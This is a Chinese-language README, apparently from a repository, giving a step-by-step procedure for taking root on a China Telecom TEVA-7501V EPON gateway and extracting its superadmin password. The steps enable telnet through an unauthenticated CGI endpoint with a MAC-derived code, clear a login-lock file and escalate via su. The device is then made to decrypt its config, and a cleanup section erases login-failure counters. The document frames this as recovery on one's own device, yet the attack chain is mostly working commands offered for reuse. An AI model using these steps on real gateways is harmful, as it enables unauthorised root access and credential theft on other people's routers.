# TEVA-7501V 超级管理员口令获取方法

> 中国电信 10G EPON 天翼网关，标签型号 **TEVA-7501V**（内部型号 `TEWA-7501V`，厂商 `tianyi`，
> 固件 `Tianyi_V1.0_JS2511`，海思平台 / `hsan` 主机名，生产日期 2026-09-28）。
> 这是这台设备**实机跑通**的取口令流程，凭据全部脱敏；只适用于自己名下的设备。

![status](https://img.shields.io/badge/status-%E5%B7%B2%E9%AA%8C%E8%AF%81-brightgreen) ![device](https://img.shields.io/badge/device-TEVA--7501V-blue) ![lang](https://img.shields.io/badge/docs-%E4%B8%AD%E6%96%87-red)

---

## 30 秒速查

| 项 | 结果 |
|---|---|
| 超管账号 | `telecomadmin` |
| 超管口令 | `telecomadmin` + **8 位数字**（TR-069 下发时随机化，因人而异） |
| **生效入口** | `http://192.168.1.1:8080`（`Server: HomeGateway`，`/usr/bin/web`） |
| 80 端口 | **不认**超管，只认 `useradmin` + 标签口令（设计如此，不是口令错） |
| 口令来源 | 设备自解明文配置 `/config/work/lastgood.xml` → `SYSMNG_ACCOUNT_ATTR_TAB.aucTeleAccountPassword` |
| 需要的三样东西 | ① 设备标识（MAC 后 8 位）② A1 **第 5 张表** ③ telnet 到 LAN 侧 |

---

## 为什么它难

```
× 猜        —— 口令是 telecomadmin + 随机 8 位，字典打不动（web 3 次/60s 锁）
× 爆配置    —— lastgood.xml 是 AES-CBC 封装，key 每次启动随机、只活在进程内存
× 走 80     —— 80 是 uhttpd+SAF，走 CheckUAPasswd 分支，压根不校验超管账号
√ 走 8080   —— 中间件 /usr/bin/web 才有超管账号体系
√ 让设备解 —— 它自己有一条 hi_decrypt_file 的 IPC 命令，喂文件名就吐明文
```

---

## 五步流程（命令级）

### 1. 摸清两台程序（不是一台）

```bash
nmap -Pn -n --open -p 21,23,80,443,8080,17998 192.168.1.1
# 80   → LuCI/uhttpd + SAF 插件，账号：useradmin
# 8080 → Server: HomeGateway，/usr/bin/web，账号：telecomadmin / useradmin
# 23   → 默认关闭，靠 8080 的 entelnet.cgi 打开
```

### 2. 用 A1 算法派生口令（**必须第 5 张表**）

天邑的 `Verification_code` 与 `su` 口令同值：`A1(表N, MAC 后 8 位倒序)`。

本机 MAC `CC:6D:55:xx:xx:CD`，
五张表结果如下。

```
表1 MTBjwaFr   表2 fKCaedbq   表3 bUwqNNSa   表4 MTBvHaFD   表5 <A1衍生值> ← 生效
```

前 4 张开 telnet，
均报 `Verification code Error!`。
第 5 张海思版返回 `SUCCESS`。
「mac_a1 对 7501V 无效」是误传，
原因是选错表。
算法原文见 [docs/01-methodology.md](docs/01-methodology.md) §3.4。

### 3. 打开 LAN telnet

```bash
curl -s -X POST http://192.168.1.1:8080/entelnet.cgi
# → {"retcode":"0","data":{"result":"BaseMac=(CC6D55xxxxxxCD)"}}      信息模式

curl -s -X POST http://192.168.1.1:8080/entelnet.cgi --data 'Verification_code=<A1衍生值>'
# → {"retcode":"0","data":{"status=SUCCESS"}}   随后 23/tcp open（nmap 复核）

curl -s -X POST http://192.168.1.1:8080/distelnet.cgi   # 用完必须关
```

参数仅在 **form body** 生效。
query 中视为空值，只返回 `BaseMac`。

### 4. 提权：su 必须真 tty

```bash
telnet 192.168.1.1        # telnetadmin / telnetadmin → $
: > /tmp/login/login_status_log        # 清 60 秒全局授权锁（该文件 0666）
su -c 'id'                # 等 Password: 出现再投 <A1衍生值>
# → uid=0(root) gid=0(root)
```

**最大的坑**：管道喂 stdin。
busybox `su` 不打印 `Password:`，
静默 `exit 1`。
众人误判口令错。

反汇编 `su_main` 可见校验顺序：
`ttyname()` 查 `/dev/pts/` 前缀，
`ioctl(SIOCGIFHWADDR)` 取 `br0` MAC，
再执行 `encode_password()`、`strcmp()`。

`/etc/shadow` 哈希是幌子：
root 和 telnetadmin 的 `$6$` 均等于 `telnetadmin`。

### 5. 让设备自己解配置 → 取口令

```bash
su -c "hi_ipc /home/cmd/encrypt/decrypt_file \
        -v ifile /config/work/lastgood.xml ofile /tmp/lg.xml"
# → /tmp/lg.xml = 233333 B 明文 XML
grep -A1 'aucTeleAccountName' /tmp/lg.xml
#   <Value Name="aucTeleAccountName" Value="telecomadmin"/>
#   <Value Name="aucTeleAccountPassword" Value="telecomadmin<8位数字>"/>
```

本地处理：`gzip -9`、`base64`、去换行。
用 `dd bs=98304 skip=N count=1` 逐块拉回，
最后 md5 对账。

---

## 端点速查（8080）

| 端点 | 鉴权 | 用途 |
|---|---|---|
| `/entelnet.cgi`、`/distelnet.cgi` | 免登录 | 开/关 LAN telnet（body 传 `Verification_code`） |
| `/web_loid_auth_show.cgi`、`/web_query_register_status.cgi` | 免登录 | LOID、光功率、注册状态 |
| `/session_key_show.cgi` | 免登录 | 取 31 位 `Sessionkey`（**一次一用**） |
| `/web_login_exe.cgi` | 免登录（提交登录） | `web_login_name=base64(user)` + `web_login_password=ivHex+AES256CBC` |
| `/get_telnet_show.cgi` | 需超管 | 回显 telnet 账号、23 端口、WAN 侧关闭 |
| `/web_query_user_show.cgi` | 需超管 | 回显 `useradmin` / `telecomadmin` 两个账号名 |

290 个真实处理器名来自二进制日志格式串：
`[WEB:%s(%d)]>>ENTER xxx_cgi`，不是猜的。

---

## 验证与清场（别只看一个口）

```bash
# 控制实验：已知正确的普通账号先登一次，证明通道没坏
curl -s -i -X POST http://192.168.1.1/cgi-bin/luci \
  --data-urlencode username=useradmin --data-urlencode psd=<标签口令> | head -3
# → 302 + Set-Cookie: sysauth=<32hex>   = 通道正常

# 超管只在 8080 生效
python3 scripts/recover_superpass_template.py   # 全流程 + 自清场
# 手工：POST /web_login_exe.cgi → {"retcode":"1","data":{"result":"success_telecomadmin"}}

# 收尾
curl -s -X POST http://192.168.1.1:8080/distelnet.cgi
timeout 5 bash -c 'exec 3<>/dev/tcp/192.168.1.1/23' || echo "23 已关"
```

---

## 六条不要踩

| # | 坑 | 正确做法 |
|---|---|---|
| 1 | 用 GET 打 `.cgi` 得 400 → 判「不存在」 | 这台机器只收 **POST** |
| 2 | 管道喂 `su` 得 `Error!` → 判「口令错」 | 真 tty，等 `Password:` |
| 3 | 拿 80 端口试超管，失败就以为口令错 | 80 只认 `useradmin`，超管入口是 8080 |
| 4 | 离线爆 AES key | key 只在 encrypt 线程内存，结构上不可能 |
| 5 | 点后台「维护结束」/「恢复出厂」 | TR-069 会重新随机化超管口令 |
| 6 | 多个会话同时 telnet | telnetd 单会话，互相踢，人人以为被锁 |

---

## 目录

| 文件 | 内容 |
|---|---|
| [docs/01-methodology.md](docs/01-methodology.md) | 通用方法论：五阶段、四档响应语义、A1 五表、加密五连判定、10 条反面模式、可复用清单 |
| [docs/03-case-study-tewa7501v.md](docs/03-case-study-tewa7501v.md) | 本机完整案例：设备档案、口令入口表、三处卡点正解、证据链、时间线 |
| [scripts/recover_superpass_template.py](scripts/recover_superpass_template.py) | 可复现脚本模板：开 telnet → su → 设备自解 → 分块搬回 → 提口令 → 关 telnet |

---

## 边界

- 仅对**自有设备**，本次用自购光猫接管自家网关。
- **零写操作**：没改口令、没恢复出厂、没动 LOID/TR-069。
- 稳定可**把 ACS 地址置空**。
  TR-069 会随机化口令。勿删连接，可能断网。
- 收工：关 telnet，清 `/tmp` 临时件和登录失败计数。

**许可**：[MIT](LICENSE)
